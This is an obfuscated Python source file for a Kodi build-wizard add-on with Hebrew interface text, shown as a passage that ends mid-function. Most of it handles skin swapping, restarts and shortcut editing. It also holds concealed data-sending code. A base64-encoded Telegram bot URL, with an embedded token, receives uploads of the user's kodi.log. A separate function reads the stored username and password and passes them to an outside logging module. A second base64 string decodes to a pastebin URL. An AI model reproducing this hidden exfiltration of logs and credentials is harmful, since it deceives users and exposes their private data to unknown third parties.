# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OOO0O0O0OOO000OOO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O000O0OO0OOO00OOO =[];OOOOOO0O0OOOO00O0 =[]#line:261
	for O0O00O0000O0O0O0O in sorted (OOO0O0O0OOO000OOO ,key =lambda OO0O00OOOO000O0O0 :OO0O00OOOO000O0O0 ):#line:262
		O00O000O000OOOOO0 =os .path .split (O0O00O0000O0O0O0O [:-1 ])[1 ]#line:263
		OOOO00OO0OO0OO0OO =os .path .join (O0O00O0000O0O0O0O ,'addon.xml')#line:264
		if os .path .exists (OOOO00OO0OO0OO0OO ):#line:265
			O0OOOOO0O0O00OOO0 =open (OOOO00OO0OO0OO0OO )#line:266
			O0O0O00OO0O000O00 =O0OOOOO0O0O00OOO0 .read ()#line:267
			O0000O0OO0000OOO0 =parseDOM2 (O0O0O00OO0O000O00 ,'addon',ret ='id')#line:268
			O0000O000O0O0OOOO =O00O000O000OOOOO0 if len (O0000O0OO0000OOO0 )==0 else O0000O0OO0000OOO0 [0 ]#line:269
			try :#line:270
				O00000OOO0OO0OO0O =xbmcaddon .Addon (id =O0000O000O0O0OOOO )#line:271
				O000O0OO0OOO00OOO .append (O00000OOO0OO0OO0O .getAddonInfo ('name'))#line:272
				OOOOOO0O0OOOO00O0 .append (O0000O000O0O0OOOO )#line:273
			except :#line:274
				pass #line:275
	OOO000OOOO00O0O00 =[];OO0O0O000OO0OOOO0 =0 #line:276
	O00O0O000OO00O00O =["Current Skin -- %s"%currSkin ()]+O000O0OO0OOO00OOO #line:277
	OO0O0O000OO0OOOO0 =DIALOG .select ("Select the Skin you want to swap with.",O00O0O000OO00O00O )#line:278
	if OO0O0O000OO0OOOO0 ==-1 :return #line:279
	else :#line:280
		O00O00000OOO0O0O0 =(OO0O0O000OO0OOOO0 -1 )#line:281
		OOO000OOOO00O0O00 .append (O00O00000OOO0O0O0 )#line:282
		O00O0O000OO00O00O [OO0O0O000OO0OOOO0 ]="%s"%(O000O0OO0OOO00OOO [O00O00000OOO0O0O0 ])#line:283
	if OOO000OOOO00O0O00 ==None :return #line:284
	for OOOO00OOOO00OO0O0 in OOO000OOOO00O0O00 :#line:285
		swapSkins (OOOOOO0O0OOOO00O0 [OOOO00OOOO00OO0O0 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OO0O00O0O0000O00O ,title ="Error"):#line:290
	O00000O0O0OO00OO0 ='lookandfeel.skin'#line:291
	OO00O0O00000000OO =OO0O00O0O0000O00O #line:292
	O00O000OO00O0O0OO =getOld (O00000O0O0OO00OO0 )#line:293
	O00OO00O0O00O000O =O00000O0O0OO00OO0 #line:294
	setNew (O00OO00O0O00O000O ,OO00O0O00000000OO )#line:295
	O0OOOOOOO000OOOOO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOOOOOO000OOOOO <100 :#line:297
		O0OOOOOOO000OOOOO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OOO000OO0OO0000OO ):#line:304
	try :#line:305
		OOO000OO0OO0000OO ='"%s"'%OOO000OO0OO0000OO #line:306
		OO0O00O000O00OO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO000OO0OO0000OO )#line:307
		OO0OOOO0O00O0000O =xbmc .executeJSONRPC (OO0O00O000O00OO0O )#line:309
		OO0OOOO0O00O0000O =simplejson .loads (OO0OOOO0O00O0000O )#line:310
		if OO0OOOO0O00O0000O .has_key ('result'):#line:311
			if OO0OOOO0O00O0000O ['result'].has_key ('value'):#line:312
				return OO0OOOO0O00O0000O ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O0O0O00000O0OOOOO ,O0OOOOOOO0O00O000 ):#line:319
	try :#line:320
		O0O0O00000O0OOOOO ='"%s"'%O0O0O00000O0OOOOO #line:321
		O0OOOOOOO0O00O000 ='"%s"'%O0OOOOOOO0O00O000 #line:322
		OO00O00O00O00OOO0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O0O00000O0OOOOO ,O0OOOOOOO0O00O000 )#line:323
		O0OOO0000000O00OO =xbmc .executeJSONRPC (OO00O00O00O00OOO0 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OO000O0000OOO000O =xbmcgui .DialogProgress ()#line:334
			OO000O0000OOO000O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OO000O0000OOO000O .update (0 )#line:338
			for O00O0OOO0O00O0OOO in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OO000O0000OOO000O .update (int ((5 -O00O0OOO0O00O0OOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O00O0OOO0O00O0OOO ),'')#line:341
				if OO000O0000OOO000O .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OO000O0000OOO000O =xbmcgui .DialogProgress ()#line:347
			OO000O0000OOO000O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OO000O0000OOO000O .update (0 )#line:351
			for O00O0OOO0O00O0OOO in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OO000O0000OOO000O .update (int ((5 -O00O0OOO0O00O0OOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O00O0OOO0O00O0OOO ),'')#line:354
				if OO000O0000OOO000O .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:364
	wiz .kodi17Fix ()#line:365
def googleindicat ():#line:366
			import logg #line:367
			OOO0OOOOOO0OOOO00 =(ADDON .getSetting ("pass"))#line:368
			O0O0OO00OOOOOO0O0 =(ADDON .getSetting ("user"))#line:369
			logg .logGA (OOO0OOOOOO0OOOO00 ,O0O0OO00OOOOOO0O0 )#line:370
def logsend ():#line:371
    import requests #line:372
    if xbmc .getCondVisibility ('system.platform.windows'):#line:373
       OO0000000O00OOO00 =xbmc .translatePath ('special://home/kodi.log')#line:374
       OO00O0OO0000O0O0O ={'chat_id':(None ,'-274262389'),'document':(OO0000000O00OOO00 ,open (OO0000000O00OOO00 ,'rb')),}#line:378
       OO00OOO000O00O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:379
       O0OO0O0OOO0O00OO0 =requests .post (OO00OOO000O00O000 .decode ('base64'),files =OO00O0OO0000O0O0O )#line:381
    elif xbmc .getCondVisibility ('system.platform.android'):#line:382
         OO0000000O00OOO00 =xbmc .translatePath ('special://temp/kodi.log')#line:383
         OO00O0OO0000O0O0O ={'chat_id':(None ,'-274262389'),'document':(OO0000000O00OOO00 ,open (OO0000000O00OOO00 ,'rb')),}#line:387
         OO00OOO000O00O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:388
         O0OO0O0OOO0O00OO0 =requests .post (OO00OOO000O00O000 .decode ('base64'),files =OO00O0OO0000O0O0O )#line:390
    else :#line:391
         OO0000000O00OOO00 =xbmc .translatePath ('special://profile/kodi.log')#line:392
         OO00O0OO0000O0O0O ={'chat_id':(None ,'-274262389'),'document':(OO0000000O00OOO00 ,open (OO0000000O00OOO00 ,'rb')),}#line:396
         OO00OOO000O00O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:397
         O0OO0O0OOO0O00OO0 =requests .post (OO00OOO000O00O000 .decode ('base64'),files =OO00O0OO0000O0O0O )#line:399
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:400
def rdoff ():#line:402
	resloginit .resloginit ('restore','all')#line:404
	O0O0000000O0O0000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:405
	O00O0O0OOOO0O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:406
	copyfile (O0O0000000O0O0000 ,O00O0O0OOOO0O0O00 )#line:407
def skindialogsettind18 ():#line:408
	try :#line:409
		O0OOO0O0O0OOO00O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:410
		OO0O00OO0OO000O0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:411
		copyfile (O0OOO0O0O0OOO00O0 ,OO0O00OO0OO000O0O )#line:412
	except :pass #line:413
def rdon ():#line:414
	loginit .loginIt ('restore','all')#line:415
	O00OO00OO0OO0O00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:417
	O0OOOO0O0OO000000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:418
	copyfile (O00OO00OO0OO0O00O ,O0OOOO0O0OO000000 )#line:419
def adults18 ():#line:421
  OO0O0O00O0O0OO000 =(ADDON .getSetting ("adults"))#line:422
  if OO0O0O00O0O0OO000 =='true':#line:423
    OO0O00OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:424
    with open (OO0O00OO0OO00O00O ,'r')as O000O0O0OO00OOOO0 :#line:425
      OO000OOOOOO000O00 =O000O0O0OO00OOOO0 .read ()#line:426
    OO000OOOOOO000O00 =OO000OOOOOO000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:444
    with open (OO0O00OO0OO00O00O ,'w')as O000O0O0OO00OOOO0 :#line:447
      O000O0O0OO00OOOO0 .write (OO000OOOOOO000O00 )#line:448
def rdbuildaddon ():#line:449
  O000O0O0O0O00OOO0 =(ADDON .getSetting ("rdbuild"))#line:450
  if O000O0O0O0O00OOO0 =='true':#line:451
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:452
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:453
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:454
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:472
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:475
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:476
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:480
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:481
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:482
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:500
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:503
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:504
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:508
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:509
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:510
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:528
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:531
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:532
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:536
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:537
      O00OO00O000O00000 =OOO00O0O0OO0O0OO0 .read ()#line:538
    O00OO00O000O00000 =O00OO00O000O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:556
    with open (O00000000OOOO00O0 ,'w')as OOO00O0O0OO0O0OO0 :#line:559
      OOO00O0O0OO0O0OO0 .write (O00OO00O000O00000 )#line:560
    O00000000OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:563
    with open (O00000000OOOO00O0 ,'r')as OOO00O0O0OO0O0OO0 :#line:564
